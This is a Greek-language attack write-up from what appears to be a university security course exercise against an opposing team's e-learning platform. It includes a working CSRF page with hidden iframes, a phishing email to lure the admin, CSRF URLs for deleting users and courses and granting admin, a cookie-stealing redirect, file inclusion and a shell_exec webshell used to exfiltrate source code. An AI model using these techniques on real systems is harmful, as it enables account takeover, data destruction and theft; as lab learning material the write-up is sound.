Η απεγγραφή ενός χρήστη από το μάθημα γίνεται μέσω ενός get request, όπως αυτό: http://edimoi-diariktes.csec.chatzi.org/modules/user/user.php?unregister=5 όπου ο αριθμός 5 αντιστοιχεί στο id του χρήστη.

Ένας απλός χρήστης μπορεί να κάνει μόνο τον εαυτό του απεγγραφή, δηλαδή σε περίπτωση που δοθεί ένα άλλο id σαν παράμετρος δεν έχει αποτέλεσμα. Αντίθετα, ο διαχειριστής μπορεί να απεγγράψει οποιονδήποτε χρήστη δίνοντας σαν παράμετρο το επιθυμητό id.

Έτσι στόχος μας ήταν να πετύχουμε απεγγραφή ενός χρήστη μέσω CSRF στον admin δίνοντας εμείς όποιο id θέλουμε.

Ωστόσο, για να πετύχει το παραπάνω attack, ο admin πρέπει πρώτα να έχει κάνει κλικ στο αντίστοιχο μάθημα. Έτσι ακολουθήσαμε παρόμοια διαδικασία με αυτήν του Defacement έτσι ώστε πρώτα να προσομοιώνεται ένα κλικ στο μάθημα που εμείς θέλουμε και στην συνέχεια να διαγράφεται ο χρήστης που θέλουμε από το μάθημα αυτό.

Για να επιτευχθεί αυτό, αρχικά δημιουργήσαμε μια html σελίδα (η οποία περιέχει και ένα script) στο puppies του server μας.
Το script αυτό βρίσκεται στην τοποθεσία **/puppies/project.html** και περιέχει:
```html
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
</head>
<body>

<h2>Γραμμική άλγεβρα</h2>
<p>
Η γραμμική άλγεβρα είναι τομέας των μαθηματικών και της άλγεβρας ο οποίος ασχολείται με τη μελέτη διανυσμάτων, διανυσματικών χώρων, γραμμικών απεικονίσεων και συστημάτων γραμμικών εξισώσεων. Η αναλυτική γεωμετρία αποτελεί έκφρασή της και η ίδια αποτελεί κεντρικό συνδετικό ιστό των σύγχρονων μαθηματικών, ιδιαιτέρως μέσω της αφηρημένης έννοιας του διανυσματικού χώρου η οποία μπορεί να μοντελοποιήσει πολλά διαφορετικά προβλήματα...
</p>
<input type="button" value="Read More" onclick="submitForms()" />
<iframe name="dummyframe" id="dummyframe" style="display: none;"></iframe>
<form action="http://edimoi-diariktes.csec.chatzi.org/modules/user/user.php"  method="get" id="form1" target="dummyframe">
  <input type="hidden" id="unregister" name="unregister" value="5"><br>
</form>

<iframe name="dummyframe2" id="dummyframe2" style="display: none;"></iframe>
<form action="http://edimoi-diariktes.csec.chatzi.org/courses/TMA102/"  method="get" target="dummyframe2" id="form2">
</form>

<script>
function submitForms (){
    document.getElementById("form2").submit();
    setTimeout(() => {  document.getElementById("form1").submit(); }, 400);

}
</script>

</body>
</html>
```
Ο παραπάνω κώδικας περιέχει:
- Αρχικά εμφανίζεται ένα άρθρο σχετικό με το μάθημα το οποίο είχε δημιουργήσει η αντίπαλη ομάδα (Γραμμική Άλγεβρα). Έπειτα από κάποιες γραμμές του άρθρου υπάρχει ένα button "Read More" το οποίο προτρέπει τον χρήστη να διαβάσει την συνέχεια του άρθρου.
- Μόλις ο χρήστης κάνει κλικ στο button "Read More", εκτελείται η συνάρτηση submitForms η οποία:
	-   Εντός ενός iframe (dummyframe2) πραγματοποιεί ένα get request στην διεύθυνση http://edimoi-diariktes.csec.chatzi.org/courses/TMA102/ , έτσι ώστε ο χρήστης να κάνει "κλικ" στο μάθημα που επιθυμούμε. Λόγω του iframe η όλη διαδικασία παραμένει κρυφή από τον χρήστη.
	-   Έπειτα από ένα μικρό timeout, πραγματοποιεί ένα get request εντός ενός iframe (dummyframe1) στην διεύθυνση http://edimoi-diariktes.csec.chatzi.org/modules/user/user.php?unregister=5 έτσι ώστε να διαγραφεί ο χρήστης με id 5 από το μάθημα TMA102. Λόγω του iframe η όλη διαδικασία παραμένει κρυφή από τον χρήστη.

Έτσι επιτυγχάνεται η διαγραφή του χρήστη από το μάθημα, χωρίς ο admin να το αντιληφθεί καθώς λόγω των iframes τα request έγιναν "κρυφά" χωρίς κάποια οπτική αντίδραση.

***Παρατήρηση***: Θα μπορούσε να μην υπάρχει το "άρθρο" και το button "Read More" και όλα να εκτελούνται κατά το "φόρτωμα" της σελίδας (όπως γίνεται και στο attack του deface).

Έχοντας δημιουργήσει την παραπάνω σελίδα στο puppies του server μας στείλαμε το παρακάτω email στον admin:
```
Καλησπέρα,

Έγραψα ένα άρθρο σχετικό με το μάθημα σας το οποίο παρακολουθώ (Γραμμική
Άλγεβρα).
Θα εκτιμούσα πολύ αν έχετε τον χρόνο να το διαβάσετε και να μου πείτε την
γνώμη σας.

Το άρθρο θα το βρείτε εδώ: http://angry-nerds.puppies.chatzi.org/project.html
```
Έτσι "πείσαμε" τον admin να μπει στην σελίδα μας και να κάνει κλικ στο "Read More", και καταφέραμε το CSRF attack.

Ο χρήστης με id 5 ήταν ένας χρήστης ο οποίος είχαμε δημιουργήσει εμείς έτσι ώστε να επιβεβαιώσουμε ότι το attack πέτυχε.

### Δικαιώματα διαχειριστή μαθήματος
Ένα ακόμη get request το οποίο εντοπίσαμε αφορά την παραχώρηση δικαιωμάτων διαχειριστή μαθήματος σε έναν απλό χρήστη. Δηλαδή, δίνεται πρόσβαση σε έναν χρήστη σε όλα τα εργαλεία διαχείρισης ενός μαθήματος.

Πιο συγκεκριμένα, αυτό γίνεται μέσω του: http://edimoi-diariktes.csec.chatzi.org/modules/user/user.php?giveAdmin=3 .

Η παραπάνω λειτουργία μπορεί να γίνει μόνο από τον admin. Επίσης για να πετύχει το συγκεκριμένο attack πρέπει ο admin να έχει κάνει πρώτα κλικ σε ένα μάθημα, το οποίο γίνεται εύκολα μέσω iframe όπως εξηγήθηκε παραπάνω.

Έτσι, για να πραγματοποιήσουμε το attack αυτό αρκεί απλά να αλλάξουμε το url του δεύτερου get request του κώδικα που παρουσιάστηκε παραπάνω στο CSRF attack που πραγματοποιήσαμε. Ωστόσο, έχοντας αποκτήσει ήδη πρόσβαση στον λογαριασμό του διαχειριστή, ήταν περιττό να στείλουμε νέο email και έτσι απλά επιβεβαιώσαμε μόνοι μας πως το attack αυτό δουλεύει.

### Διαγραφή τμήματος
Ένα ακόμη get request το οποίο εντοπίσαμε αφορά την διαγραφή ενός τμήματος.

Αυτό γίνεται μέσω του εξής url: http://edimoi-diariktes.csec.chatzi.org/modules/admin/addfaculte.php?a=2&c=5

Η παραπάνω λειτουργία μπορεί να γίνει μόνο από τον admin. To attack γίνεται πολύ εύκολα μέσω ενός iframe καθώς δεν χρειάζονται περαιτέρω ενέργειες (όπως κλικ σε μάθημα).

Αντίστοιχα με το προηγούμενο attack δεν στείλαμε email στον admin καθώς είχαμε ήδη πρόσβαση στον λογαριασμό του. Επιβεβαιώσαμε μόνοι μας πως δουλεύει.

### Διαγραφή μαθήματος
Εντοπίσαμε δύο get requests μέσω των οποίων μπορεί να διαγραφεί ένα μάθημα. Τα δύο αυτά requests είναι:
- http://edimoi-diariktes.csec.chatzi.org/modules/admin/delcours.php?c=TMA106&delete=yes
- http://edimoi-diariktes.csec.chatzi.org/modules/course_info/delete_course.php?delete=yes

Η δεύτερη λειτουργία μπορεί να γίνει και από έναν χρήστη που είναι διαχειριστής μαθήματος (και όχι admin), ενώ και οι δύο μπορούν να γίνουν από τον admin.

Για την δεύτερη επίθεση απαιτείται πρώτα να έχει γίνει κλικ στο μάθημα το οποίο εύκολα επιτυγχάνεται μέσω ενός iframe όπως δείξαμε.

Ομοίως, δεν στείλαμε email για να πραγματοποιήσουμε τα attacks αυτά. Εύκολα υλοποιούνται με τον ίδιο τρόπο που υλοποιήθηκε το πρώτο attack που παρουσιάσαμε.

### Διαγραφή χρήστη
Ένα ακόμα CSRF attack που εντοπίσαμε είναι η διαγραφή ενός χρήστη από την εφαρμογή. Η λειτουργία αυτή μπορεί να γίνει μόνο από τον admin μέσω του εξής request:
- http://edimoi-diariktes.csec.chatzi.org/modules/admin/unreguser.php?u=9&c=&doit=yes

To παραπάνω request διαγράφει τον χρήστη με id 9 από την εφαρμογή.

Ωστόσο, για να διαγραφεί ένας χρήστης από την εφαρμογή απαιτείται πρώτα να έχει απεγγραφεί από όλα τα μαθήματα στα οποία ήταν εγγεγραμμένος. Όπως παρουσιάσαμε στο πρώτο CSRF attack, μπορούμε να επιτύχουμε την απεγγραφή ενός χρήστη από ένα μάθημα μέσω CSRF χρησιμοποιώντας iframes. Έτσι τα δύο αυτά attacks μπορούν να χρησιμοποιηθούν συνδυαστικά. Δηλαδή, αρχικά εκτελείται ο κώδικας που παρουσιάσαμε για την απεγγραφή του χρήστη από όσα μαθήματα είναι εγγεγραμμένος και στην συνέχεια εκτελείται ένα τελευταίο get request (στο http://edimoi-diariktes.csec.chatzi.org/modules/admin/unreguser.php?u=9&c=&doit=yes) εντός ενός iframe για την απεγγραφή του χρήστη από την εφαρμογή.

### Προσθήκη εξωτερικού σύνδεσμου στο αριστερό μενού
Στα εργαλεία διαχείρισης ενός μαθήματος και συγκεκριμένα στο εργαλείο "Ενεργοποίηση Εργαλείων" υπάρχει η δυνατότητα "Προσθήκη εξωτερικού σύνδεσμου στο αριστερό μενού" η οποία εισάγει στο αριστερό μενού του μαθήματος (μαζί με τις Εργασίες, Ανταλλαγή Αρχείων κλπ.) έναν υπερσύνδεσμο για μια άλλη ιστοσελίδα. Ο σύνδεσμος αυτός έχει έναν τίτλο τον οποίο διαλέγει ο διαχειριστής και κάνοντας κλικ σε αυτόν ανακατευθύνει τον χρήστη σε έναν σύνδεσμο τον οποίο έχει επίσης προκαθορίσει ο διαχειριστής.

Η προσθήκη ενός τέτοιου εξωτερικού συνδέσμου γίνεται μέσω ενός get request όπως αυτός:
- http://edimoi-diariktes.csec.chatzi.org/modules/course_tools/course_tools.php?submit=yes&action=2&link=http://angry-nerds.puppies.chatzi.org/thesis/&name_link=IMPORTAN_PROJECT&submit=Προσθήκη

Αν ο admin εκτελέσει το παραπάνω get request τότε προστίθεται στις λειτουργίες του μαθήματος ένας σύνδεσμος με όνομα IMPORTANT PROJECT ο οποίος ανακετευθύνει όποιον χρήστη κάνει κλικ σε αυτόν στην puppies σελίδα μας και συγκεκριμένα στο http://http://angry-nerds.puppies.chatzi.org/thesis/ μέσω του οποίου του "κλέβουμε" το cookie (όπως στο Deface).

![alt text](https://drive.google.com/uc?export=view&id=1FtzBtsYueR-ssffA38ewfect0xi2nqxz)

Το παραπάνω attack μπορεί πολύ εύκολα να επιτευχθεί μέσω ενός iframe, όμοια με των κώδικα που παρουσιάσαμε.

## Remote File Inclusion (RFI)

Η αντίπαλη ομάδα είχε ασφαλίσει καλά τις λειτουργίες "Εργασίες" και "Ανταλλαγή Αρχείων" μέσω των οποίων μπορούσαμε να ανεβάσουμε αρχεία. Πιο συγκεκριμένα είχαν προσθέσει ένα τυχαίο όνομα στα αρχεία των εργασιών (κάτι γινόταν μόνο στην Ανταλλαγή Αρχείων στην αρχική έκδοση της εφαρμογής). Επίσης όλα τα αρχεία (ανεξαρτήτως τύπου) αποθηκεύονταν σαν text files (.txt) και έτσι δεν μπορούσαν να εκτελεστούν.

Βέβαια πρέπει να σημειωθεί πως λόγω της μετατροπής των αρχείων σε .txt, η λειτουργία του διαχειριστή "Κατέβασμα όλων των εργασιών σε αρχείο .zip" δεν λειτουργούσε σωστά καθώς όλα τα αρχεία κατέβαιναν σε .txt format με το τυχαίο όνομα που του δίνεται και όχι με το αρχικό τους όνομα και την κατάληξη.

Στην συνέχεια, κατευθυνθήκαμε στην λειτουργία "Ανέβασμα ιστοσελίδας" στα εργαλεία μαθήματος, αλλά ήταν απενεργοποιημένη.

Τέλος, βρήκαμε απροστάτευτη την σελίδα **/modules/import/import.php** μέσω της οποίας ο διαχειριστής μπορεί να ανεβάσει ένα αρχείο html το οποίο προστίθεται στο αριστερό μενού ενός μαθήματος σαν επιπλέον εργαλείο μαζί με τα 4 υπόλοιπα (Εργασίες, Ανταλλαγή Αρχείων, κλπ.).

Το πως ακριβώς επιτεύχθηκε τo RFI attack εξηγείται αναλυτικά παραπάνω στην παράγραφο Deface.

## Extra Attack

Έχοντας την δυνατότητα (μέσω RFI) να εκτελέσουμε δικά μας PHP αρχεία, μπορούμε να εκτελέσουμε εντολές κελύφους απευθείας στον server των αντιπάλων.
Αυτό επιτυγχάνεται μέσω της συνάρτησης shell_exec της php και δίνοντας της σαν όρισμα την εντολή προς εκτέλεση.

Έτσι, μπορούμε να εκτελέσουμε οποιαδήποτε λειτουργία επιθυμούμε στον αντίπαλο server.

Μια από τις "επιθέσεις" που κάναμε είναι να πάρουμε όλον τον κώδικα της εφαρμογής τους.

Πιο συγκεκριμένα ανεβάσαμε ένα php αρχείο στο μάθημα TMA103 το οποίο αποθηκεύεται στην τοποθεσία: **/courses/TMA103/page/**.
Εκτελώντας την παρακάτω εντολή:
```
cd .. ; cd .. ; cd .. ; tar cvfz modules.tar.gzip modules
```
δημιουργείται ένα zipped file με τον κατάλογο modules, το οποίο μπορούμε να κατεβάσουμε απευθείας από εδώ: http://edimoi-diariktes.csec.chatzi.org/modules.tar.gzip .

Αντίστοιχα μπορεί να πραγματοποιηθεί και για οποιοδήποτε άλλο directory.

